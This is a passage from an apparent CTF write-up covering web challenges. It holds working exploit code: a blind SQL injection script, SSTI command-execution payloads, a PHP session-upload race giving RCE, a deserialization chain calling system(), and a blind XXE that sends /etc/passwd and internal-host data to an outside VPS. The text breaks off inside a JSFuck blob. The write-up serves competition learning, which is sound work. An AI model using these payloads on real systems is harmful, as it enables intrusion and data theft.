r.apparent_encoding</span><br><span class="line">        <span class="keyword">if</span> start &gt;= end:</span><br><span class="line">            <span class="keyword">return</span> start</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> time() - t &gt; <span class="number">0.3</span>:</span><br><span class="line">            start = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contentblind</span>():</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= lenth:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;usname&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pswd&#x27;</span>: <span class="string">f&#x27;&#x27;&#x27;/**/or/**/if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>,sleep(0.3),0)/**/#&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            t = time()</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            <span class="keyword">if</span> time() - t &gt; <span class="number">0.3</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lenth = lensqlblind()</span><br><span class="line"><span class="built_in">print</span>(lenth)</span><br><span class="line">contentblind()</span><br></pre></td></tr></table></figure><h2 id="ezpy"><a href="#ezpy" class="headerlink" title="ezpy"></a>ezpy</h2><p>SSTI模板注入</p><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls:</span><br><span class="line">http:<span class="comment">//81.70.102.209:10030//welhectf?name=&#123;%set%20a=()[%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27][%27\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f%27][0][%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27]()[205](%27ls%27,shell=True,stdout=-1)[%27\x63\x6f\x6d\x6d\x75\x6e\x69\x63\x61\x74\x65%27]()%&#125;&#123;%print%20a%&#125;</span></span><br><span class="line">读取flag:</span><br><span class="line">http:<span class="comment">//81.70.102.209:10030//welhectf?name=&#123;%set%20a=()[%27\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%27][%27\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f%27][0][%27\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%27]()[196][%27\x5f\x5f\x69\x6e\x69\x74\x5f\x5f%27][%27\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f%27][%27\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f%27][%27open%27](%27f1ag.txt%27).read()%&#125;&#123;%print%20a%&#125;</span></span><br></pre></td></tr></table></figure><h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>session.upload_progress漏洞</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://81.70.102.209:10040/index.php&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php echo &#x27;123aaa&#x27;;system(&#x27;cat /f1aggggggggggggggggggggggg&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;http://81.70.102.209:10040/index.php?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;http://81.70.102.209:10040/index.php?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;123aaa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="comment"># with open(&#x27;return.html&#x27;, &#x27;w&#x27;) as f:</span></span><br><span class="line">            <span class="comment">#     f.write(response.text)</span></span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">x</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params"><span class="variable">$func</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>(<span class="keyword">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$array</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;array = [<span class="keyword">new</span> c(<span class="string">&#x27;\system&#x27;</span>), <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;value = [<span class="keyword">new</span> c(<span class="string">&#x27;cat /flag&#x27;</span>), <span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = serialize(<span class="keyword">new</span> x);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> a;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$p</span>);</span><br></pre></td></tr></table></figure><p>执行完及那个 x 类的内容数量从 2 改为 3</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:TzoxOiJhIjoyOntzOjQ6Im5pY2UiO3M6Mzc6Ik86MToieCI6Mzp7czo1OiJ2YWx1ZSI7TjtzOjI6ImNjIjtOO30iO3M6NDoidGVzdCI7TzoxOiJiIjoyOntzOjU6InZhbHVlIjthOjI6e2k6MDtPOjE6ImMiOjE6e3M6NToidmFsdWUiO3M6OToiY2F0IC9mbGFnIjt9aToxO3M6NToic2hlbGwiO31zOjU6ImFycmF5IjthOjI6e2k6MDtPOjE6ImMiOjE6e3M6NToidmFsdWUiO3M6NzoiXHN5c3RlbSI7fWk6MTtzOjU6InNoZWxsIjt9fX0=</span><br></pre></td></tr></table></figure><h2 id="退学申请提交处"><a href="#退学申请提交处" class="headerlink" title="退学申请提交处"></a>退学申请提交处</h2><p>进去一看是个XXE，没有回显，利用vps进行得到回显</p><p>注入payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">submit</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://82.157.174.226:10002/demo.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">submit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">stuid</span>&gt;</span><span class="tag">&lt;/<span class="name">stuid</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">submit</span>&gt;</span></span><br></pre></td></tr></table></figure><p>vps文件demo.dtd：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>成功注入，查看内网主机：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/host&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IP address       HW type     Flags       HW address            Mask     Device</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.2</span>      <span class="number">0x1</span>         <span class="number">0x0</span>         <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.4</span>      <span class="number">0x1</span>         <span class="number">0x0</span>         <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.1</span>      <span class="number">0x1</span>         <span class="number">0x2</span>         <span class="number">02</span>:<span class="number">42</span>:ad:<span class="number">91</span>:ff:<span class="number">31</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.6</span>      <span class="number">0x1</span>         <span class="number">0x0</span>         <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.8</span>      <span class="number">0x1</span>         <span class="number">0x2</span>         <span class="number">02</span>:<span class="number">42</span>:c0:a8:<span class="number">02</span>:<span class="number">08</span>     *        eth0</span><br><span class="line"><span class="number">192.168</span><span class="number">.2</span><span class="number">.3</span>      <span class="number">0x1</span>         <span class="number">0x0</span>         <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>     *        eth0</span><br></pre></td></tr></table></figure><p>一个一个试一下，最终在192.168.2.8</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://192.168.2.8&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>服务器得到回显</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@VM<span class="number">-8</span><span class="number">-15</span>-debian:~# nc -lvp <span class="number">10080</span></span><br><span class="line">listening on [any] <span class="number">10080</span> ...</span><br><span class="line"><span class="number">81.70</span><span class="number">.102</span><span class="number">.209</span>: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [<span class="number">10.0</span><span class="number">.8</span><span class="number">.15</span>] from (UNKNOWN) [<span class="number">81.70</span><span class="number">.102</span><span class="number">.209</span>] <span class="number">38430</span></span><br><span class="line">GET /?p=aGVjdGZ7YjFpbmRfMDBCX3hYZX0= HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">82.157</span><span class="number">.174</span><span class="number">.226</span>:<span class="number">10080</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>base64解码即得到flag</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="快来公众号ya"><a href="#快来公众号ya" class="headerlink" title="快来公众号ya"></a>快来公众号ya</h2><p>关注公众号回复flag获得</p><h2 id="JamesHarden"><a href="#JamesHarden" class="headerlink" title="JamesHarden"></a>JamesHarden</h2><p>压缩出来看了下文件头，还是一个zip压缩包，里面有个class</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java JamesHarden</span><br></pre></td></tr></table></figure><p>得到URPGS{Jr1p0zr_G0_U3pg6_!}，觉得是凯撒，试了一下确实是，位移12位</p><h2 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h2><p>word文件进去全选修改格式，得到</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]